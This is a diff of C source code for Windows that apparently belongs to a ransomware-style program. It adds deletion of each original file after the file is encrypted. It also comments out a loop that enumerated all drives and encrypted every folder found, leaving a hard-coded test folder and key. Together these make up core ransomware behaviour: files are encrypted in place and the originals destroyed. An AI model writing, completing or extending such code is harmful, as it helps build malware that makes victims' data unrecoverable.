@@ -262,6 +262,13 @@ void encryptFile(const char* inputFile, const char* outputFile, const char* aesK
     memset(chunk, 0, chunk_size);
   }
 
+  // Delete the original file after encryption
+  if (!DeleteFileA(inputFile)) {
+    printf("error deleting file %s: %d\n", inputFile, GetLastError());
+  } else {
+    printf("successfully deleted the original file: %s\n", inputFile);
+  }
+
   if (hKey != NULL) {
     CryptDestroyKey(hKey);
   }
@@ -424,15 +431,15 @@ int main() {
   const char* rootFolder = "C:\\Users\\user\\Desktop\\books";
   const char* privateKey = "mymy16ByteKey12";
   encryptFiles(rootFolder, privateKey);
-  char folders[MAX_FOLDERS][MAX_PATH];
-  int folderCount = 0;  
+  // char folders[MAX_FOLDERS][MAX_PATH];
+  // int folderCount = 0;  
 
-  enumerateDrives(folders, &folderCount);
-  // encrypt the enumerated folders
-  printf("Enumerated Folders:\n");
-  for (int i = 0; i < folderCount; ++i) {
-    printf("%s\n", folders[i]);
-    encryptFiles(folders[i], privateKey);
-  }
+  // enumerateDrives(folders, &folderCount);
+  // // encrypt the enumerated folders
+  // printf("Enumerated Folders:\n");
+  // for (int i = 0; i < folderCount; ++i) {
+  //   printf("%s\n", folders[i]);
+  //   encryptFiles(folders[i], privateKey);
+  // }
   return 0;
 }
